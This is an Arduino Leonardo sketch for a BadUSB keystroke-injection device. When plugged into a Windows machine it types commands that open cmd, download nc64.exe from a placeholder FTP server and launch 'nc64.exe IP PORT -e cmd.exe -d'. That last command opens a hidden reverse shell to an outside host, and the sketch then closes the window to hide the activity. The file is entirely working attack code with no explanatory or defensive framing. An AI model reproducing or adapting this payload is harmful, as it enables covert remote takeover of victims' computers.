#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("cmd");
  delay(5000);
  Keyboard.println("ftp");
  delay(2000);
  Keyboard.println("open IPSERVERFTP");
  delay(5000);
  Keyboard.println("USERNAME");
  delay(2000);
  Keyboard.println("PASSWORD");
  delay(5000);
  Keyboard.println("binary");
  delay(2000);
  Keyboard.println("GET nc64.exe");
  delay(4000);
  Keyboard.println("bye");
  delay(2000);
  Keyboard.println("nc64.exe IP PORT -e cmd.exe -d");
  delay(5000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(100);
  Keyboard.releaseAll();
  while(1);
}
